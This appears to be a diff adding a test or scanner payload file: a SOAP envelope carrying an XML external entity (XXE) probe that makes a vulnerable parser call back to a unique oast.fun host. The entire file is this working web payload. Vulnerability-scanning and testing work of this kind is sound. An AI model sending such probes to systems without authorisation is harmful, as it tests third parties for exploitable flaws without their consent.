@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE Envelope [<!ENTITY callback SYSTEM "https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/36-soap-xxe">]>
+<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><probe>&callback;</probe></Body></Envelope>
